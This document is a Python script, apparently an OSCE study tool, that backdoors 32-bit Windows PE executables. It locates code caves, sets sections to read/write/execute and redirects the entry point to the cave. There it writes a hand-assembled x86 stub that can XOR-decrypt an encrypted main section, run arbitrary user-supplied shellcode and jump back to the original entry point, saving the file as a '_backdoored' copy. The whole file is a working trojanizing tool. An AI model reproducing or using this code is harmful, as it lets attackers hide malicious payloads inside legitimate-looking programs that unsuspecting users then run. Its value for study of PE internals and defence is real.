#!/usr/bin/python3

"""

	Jean-Pierre LESUEUR (@DarkCoderSc)
	https://www.phrozen.io/
	jplesueur@phrozen.io

	License: MIT

	Category: Offensive Security Certified Expert Preparation.

	Description:
		This tool was created during my OSCE preparation to master PE Files Backdooring and `Encryption`
		This is far from being a tool for production purpose, it was created to enhance my knowledge about this
		interesting topic using basic and minimalist techniques. 
		
		Use automated tool when you know how to do it by hands!

	TODO:
		- Offer an option to create an executable section to host payload.
		  (Artificial Code Cave Creation)
		- Port this script to x86-64
		- Better section encryption mechanism
		- Better Comment ?

	Requirement:
		- pip install pefile
"""

import pefile
import struct
import argparse
import sys
import os

class tcolors:
	clear = "\033[0m"
	green = "\033[32m"
	red = "\033[31m"
	yellow = "\033[33m"
	blue = "\033[34m"
	gray = "\033[90m"


def success(message):
	print(f"[\033[32m✓\033[39m] {message}")


def error(message):
	print(f"\033[31m{message}\033[39m")


def debug(message):
	print(f"[\033[34m*\033[39m] {message}")	

def warning(message):
	print(f"[\033[33m!\033[39m] {message}")


def title(title):
	print("\n" + ("=" * 45))
	print(f" {title}")
	print("=" * 45)


def bytearr_to_bytestr(data):
	return ''.join(f"\\x{'{:02x}'.format(x)}" for x in data)


def bytestr_to_bytearr(data):
	return list(bytearray.fromhex(data.replace("\\x", " ")))


class CodeCave:
	"""
		Class containing information about a found code cave
	"""

	def __init__(self, name, section, offset, size, cave_type):
		self.name = name
		self.section = section
		self.offset = offset	
		self.size = size	
		self.type = cave_type


def get_section_by_address(address):
	for section in pe.sections:

		section_begin_address = (image_base + section.VirtualAddress)
		section_end_address = (section_begin_address + section.SizeOfRawData)

		if (address >= section_begin_address) and (address <= section_end_address):
			return section

	return None


def get_section_name(section):
	"""
		Return the name of a PE Section and strip for extra zeroes

		A section name is always equal to zero bytes and padded with zeros.
	"""

	if not section:
		return ""

	return section.Name.decode("utf-8").strip('\0').lower()


def define_section_rwe(section):
	"""
		Update section flag to Execute | Read | Write -> 0xE0000020
	"""
	flags = 0xe0000020

	if section.Characteristics != flags:
		debug(f"Section flags updated from {hex(section.Characteristics)} to {hex(flags)} (READ / WRITE / EXECUTE)")

		section.Characteristics = flags


def code_cave_finder(section, cave_opcode):
	"""
		Find a succession of x NOP's or a succession of x NULL Bytes in a section.

		To be consired as a code cave, buffer space must be at least equal or above 50 Bytes.

		Section must be executable in order to host our payload.	
	"""

	name = get_section_name(section)

	if len(search_in_sections) > 0:
		if not name in search_in_sections:
			return False

	offset = section.VirtualAddress

	section_data = pe.get_memory_mapped_image()[offset:offset + section.SizeOfRawData]		

	cave_length = 0	

	for index, b in enumerate(section_data, start=1):			
		if (b == cave_opcode):				
			cave_length += 1	

		if ((b != cave_opcode) and (cave_length > 0)) or (index == len(section_data)):
			
			if cave_length >= argv.cave_min_size:					
				cave = CodeCave(name, section, (index - cave_length), cave_length, cave_opcode)

				code_caves.append(cave)
			
			cave_length = 0

	return True


def encrypt_section(section, xor_key):
	"""
		Encrypt whole PE Section using a basic XOR Encoder (4 Bytes Key)
	"""

	offset = section.VirtualAddress

	section_data = bytearray(pe.get_memory_mapped_image()[offset:offset + section.SizeOfRawData])

	for index, b in enumerate(section_data):				
		section_data[index] =  b ^ xor_key # b ^ (index % 256)

	pe.set_bytes_at_offset(section.PointerToRawData, bytes(section_data))	


def get_rel_distance(origine, destination):
	"""
		Retrieve the relative distance between two locations.

		location is relative to image_base
	"""
	origine += image_base
	destination += image_base

	distance = 0x0

	if origine > destination:
		distance = (0x0 - (origine - destination)) & 0xffffffff
	else:		
		distance = (destination - origine)

	return distance



'''
-------------------------------------------------------------------------------------------------------

	Entry Point
	
-------------------------------------------------------------------------------------------------------
'''
if __name__ == "__main__":
	search_in_sections = [] # [] = All Sections
	try:
		argument_parser = argparse.ArgumentParser(description=f"PE Backdoor Helper by {tcolors.blue}@DarkCoderSc{tcolors.clear}")

		argument_parser.add_argument('-f', '--file', type=str, dest="file", action="store", required=True, help="Valid PE File location (Ex: /path/to/calc.exe).")

		argument_parser.add_argument('-p', '--payload', type=str, dest="payload", action="store", required=False, default="", help="Shellcode Payload (Example: \"\\x01\\x02\\x03...\\x0a\").")

		argument_parser.add_argument('-x', '--encrypt', dest="encrypt_main_section", action="store_true", required=False, default=False, help="Encrypt main section (entry point section).")		

		argument_parser.add_argument('-k', '--encryption-key', type=str, dest="encryption_key", action="store", required=False, default="\\x0c", help="Define custom encryption key (1 Byte only).")		

		argument_parser.add_argument('-c', '--cave-opcodes', type=str, dest="cave_opcodes", action="store", default="\\x00\\x90", help="Define code opcode list to search for.")

		argument_parser.add_argument('-s', '--cave-min-size', type=int, dest="cave_min_size", action="store", default=50, help="Minimum size of region to be considered as code cave.")				

		argument_parser.add_argument('-e', '--egg', type=str, dest="egg", action="store", required=False, default="egg!", help="Define a custom egg name (ESP Restore Mechanism)")

		try:
			argv = argument_parser.parse_args()		
		except IOError as e:
			parser.error()


		if not argv.encrypt_main_section and (len(argv.payload) == 0):
			raise Exception("You must either define a payload or decide to encrypt main section of target file in order to find this tool useful.")


		try:
			shellcode = bytestr_to_bytearr(argv.payload)
			cave_opcode = bytestr_to_bytearr(argv.cave_opcodes)
			encryption_key = bytestr_to_bytearr(argv.encryption_key)
		except:
			raise Exception("Malformed byte string. A byte string must be defined with the following format: \"\\x01\\x02\\x03...\\x0a\".")


		if len(encryption_key) > 1:
			raise Exception("Encryption key must be equal to 1 byte. Example: \"\\x0c\"")

		debug(f"Loading PE File: {tcolors.blue}\"{argv.file}\"{tcolors.clear}")

		pe = pefile.PE(argv.file, fast_load=False)	
	
		image_base = pe.OPTIONAL_HEADER.ImageBase
		entry_point_address = pe.OPTIONAL_HEADER.AddressOfEntryPoint

		if pe.FILE_HEADER.Machine != pefile.MACHINE_TYPE["IMAGE_FILE_MACHINE_I386"]:
			raise Exception("This script is not compatible with x86-64 PE Files.")

		debug(f"Image Base: {tcolors.blue}{hex(image_base)}{tcolors.clear}")
		debug(f"Entry Point: {tcolors.blue}{hex(entry_point_address)}{tcolors.clear}")

		#
		# Enumerate Code Caves in Executable Sections
		#

		code_caves = []

		if len(cave_opcode) == 0:
			raise Exception(f"You must specify at least one code cave opcode (Ex: {tcolors.blue}\\x00\\x90{tcolors.clear}")

		debug("Searching for code caves...")
		for section in pe.sections:
			debug(f"Scanning {tcolors.blue}\"{get_section_name(section)}\"{tcolors.clear}, " \
			      f"VirtualOffset=[{hex(section.VirtualAddress)}], RawOffset=[{hex(section.PointerToRawData)}], " \
			      f"Size=[{hex(section.SizeOfRawData)}], Characteristics=[{hex(section.Characteristics)}]")

			for opcode in cave_opcode:
				code_cave_finder(section, opcode)


		#
		# List found code caves
		#	
		if len(code_caves) == 0:
			warning("No code cave present in target file.")
		else:
			title("Code Cave Results")
			for index, cave in enumerate(code_caves):
				print(f"({tcolors.green}{index +1}{tcolors.clear}) Code cave in section=[{tcolors.blue}{cave.name}{tcolors.clear}], "\
					  f"relative_offset=[{hex(cave.offset)}], cave_size=[{hex(cave.size)}], cave_type=[{hex(cave.type)}]")

			#
			# Select desired code cave for payload injection
			#
			cave = None		
			while True:
				print(f"\nEnter desired code cave index for code injection (CTRL+C to abort): ", end="")
				try:					
					choice = int(input())				

					if (choice < 1) or (choice > len(code_caves)):
						continue
				
					cave = code_caves[choice -1]

					break
				except KeyboardInterrupt:
					raise Exception("\nExecution aborted.")
				except:
					continue

			if not cave:
				raise Exception("Unexpected error.")

			debug("Checking if cave section has correct flags set...")

			define_section_rwe(cave.section)

			debug("Retrieve section of entrypoint...")
			entry_section = get_section_by_address(image_base + entry_point_address)
			if not entry_section:
				raise Exception("Could not find section of entrypoint...")

			success(f"Entrypoint is located in {get_section_name(entry_section)}.")			

			new_entry_point_address = (cave.section.VirtualAddress + cave.offset)

			debug(f"Patch entrypoint address with code cave address: {hex(entry_point_address)} to {hex(new_entry_point_address)}.")

			pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_entry_point_address

			#
			# Start Encryption Mechanisms
			#

			if argv.encrypt_main_section:
				debug("Prepare main section (entrypoint section) encryption...")				

				define_section_rwe(entry_section)

				debug("Start encryption....")

				encrypt_section(entry_section, encryption_key[0])					

				success("Main section successfully encrypted.")

			debug("Carving code cave payload...")

			#
			# Prologue
			#

			debug("Writing code cave prologue: saving registers, flags, ESP recovery mechanism...")			

			# Save registers and flags
			payload = b""
			payload += b"\x60" # pushad
			payload += b"\x9C" # pushfd						

			# Place eggs to recover stack state (restore ESP to original and expected value)		
			egg = argv.egg.encode('ascii')[::-1]
			payload += ((b"\x68" + egg) * 2) # egg!egg!


			#
			# Decryption Routine (If encryption was requested)
			# 
			if argv.encrypt_main_section:
				debug("Writing code cave decryption routine to decrypt main section...")

				payload += b"\xe8\x00\x00\x00\x00"              # call (next_instruction) and save EIP to ESP
				payload += b"\x5e"                              # pop esi
				payload += b"\x83\xee"                          # sub esi, (payload_length)
				payload += struct.pack("B", len(payload)- 3)    # -3 because we don't count two last instructions
				payload += b"\x56"                              # push esi
				payload += b"\x5f"                              # pop edi
				payload += b"\x81\xc7"                          # add edi, (size of cave)
				payload += struct.pack("<I", cave.size)         # size of cave in Little Endian
				payload += b"\x56"                              # push esi
				payload += b"\x58"                              # pop eax

				origine_offset = image_base + cave.section.VirtualAddress + cave.offset
				destination_offset = image_base + entry_section.VirtualAddress

				if origine_offset > destination_offset:
					payload += b"\x2d"                          # sub eax, ????????
					payload += struct.pack("<I", (origine_offset - destination_offset))
				else:
					payload += b"\x05"                          # add eax, ????????
					payload += struct.pack("<I", (destination_offset - origine_offset))

				payload += b"\x50"         # push eax
				payload += b"\x5b"         # pop ebx
				payload += b"\x81\xc3"     # add ebx, (main section start + end)
				payload += struct.pack("<I", entry_section.SizeOfRawData)

				payload += b"\x3b\xc6"     # cmp eax, esi
				payload += b"\x7c\x04"     # jl (xor routine)
				payload += b"\x3b\xc7"     # cmp eax, edi
				payload += b"\x7c\x03"     # jl (inc eax)
				payload += b"\x80\x30"     # xor byte [eax], (xor_key_byte)
				payload += struct.pack("B", encryption_key[0])
				payload += b"\x40"         # inc eax
				payload += b"\x3b\xc3"     # cmp eax, ebx
				payload += b"\x75\xf0"     # jne (cmp eax, esi)


			#
			# Insert Shellcode
			#
			if argv.payload:
				debug(f"Writing shellcode payload, size=[{hex(len(shellcode))}]...")

				payload += bytes(shellcode)

			#
			# Epilogue (Restore ESP, registers, entrypoint)
			#

			debug("Writing code cave epilogue: restore ESP, flags, registers and jump back to original entrypoint...")		

			# restore ESP
			payload += b"\xb8" + egg   # mov eax, "egg"
			payload += b"\x54"         # push esp
			payload += b"\x5f"         # pop edi
			payload += b"\xaf"         # scasd
			payload += b"\x75\x0c"     # jnz _pop_ebx
			payload += b"\xaf"         # scasd
			payload += b"\x75\x09"     # jnz _pop_ebx
			payload += b"\x57"         # push edi
			payload += b"\x5c"         # pop esp

			# Restore Registers
			payload += b"\x9D"         # popfd
			payload += b"\x61"         # popad		

			instruction_size = 5  # bytes (0xe9/jmp) 0x???????? (Little Endian)

			from_offset = cave.section.VirtualAddress + cave.offset + len(payload) + instruction_size

			jmp_to_offset = get_rel_distance(from_offset, entry_point_address)

			# Jump back to original entrypoint
			payload += b"\xe9"                           # jmp
			payload += struct.pack("<I", jmp_to_offset)  # ????????

			# Part of ESP restoration
			payload += b"\x5b"                           # pop ebx
			payload += b"\xeb\xee"                       # jmp _push_esp		

			#
			# Write Final Payload to Section
			#

			if len(payload) > cave.size:
				error("Cave size is too small to be used with your payload.")
			else:
				pe.set_bytes_at_offset((cave.section.PointerToRawData + cave.offset), payload)

				file_info = os.path.splitext(argv.file)

				output_file = f"{file_info[0]}_backdoored{file_info[1]}"

				success(f"Success! backdoored version location: \"{output_file}\".")
						
				pe.write(output_file)
	except Exception as e:
		exc_type, exc_obj, exc_tb = sys.exc_info()
		error(f"{str(e)}, line=[{exc_tb.tb_lineno}]")
